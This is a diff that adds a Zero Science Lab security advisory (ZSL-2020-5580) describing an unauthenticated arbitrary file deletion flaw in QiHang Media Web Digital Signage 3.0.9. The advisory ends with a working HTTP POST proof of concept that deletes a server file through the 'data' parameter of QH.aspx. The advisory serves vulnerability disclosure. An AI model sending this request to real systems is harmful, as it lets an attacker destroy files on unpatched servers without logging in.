@@ -1,0 +1,58 @@
+# Exploit Title: QiHang Media Web Digital Signage 3.0.9 - Unauthenticated Arbitrary File Deletion
+# Date: 2020-08-12
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.howfor.com
+# Tested on: Microsoft Windows Server 2012 R2 Datacenter
+# CVE : N/A
+
+QiHang Media Web (QH.aspx) Digital Signage 3.0.9 Unauthenticated Arbitrary File Deletion
+
+
+Vendor: Shenzhen Xingmeng Qihang Media Co., Ltd.
+        Guangzhou Hefeng Automation Technology Co., Ltd.
+Product web page: http://www.howfor.com
+Affected version: 3.0.9.0
+
+Summary: Digital Signage Software.
+
+Desc: Input passed to the 'data' parameter in 'QH.aspx' for delete action
+is not properly sanitised before being used to delete files. This can be
+exploited by an unauthenticated attacker to delete files with the permissions
+of the web server using their absolute path or via directory traversal
+sequences passed within the affected POST parameter.
+
+
+Tested on: Microsoft Windows Server 2012 R2 Datacenter
+           Microsoft Windows Server 2003 Enterprise Edition
+           ASP.NET 4.0.30319
+           HowFor Web Server/5.6.0.0
+           Microsoft ASP.NET Web QiHang IIS Server
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5580
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5580.php
+
+
+27.07.2020
+
+--
+
+
+POST /QH.aspx HTTP/1.1
+Host: 192.168.1.74:8090
+Content-Length: 105
+User-Agent: Eraser
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Origin: http://192.168.1.74:8090
+Referer: http://192.168.1.74:8090/index.htm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+responderId=ResourceNewResponder&action=delete&data=["/opt/resources/Billboard.jpg"]
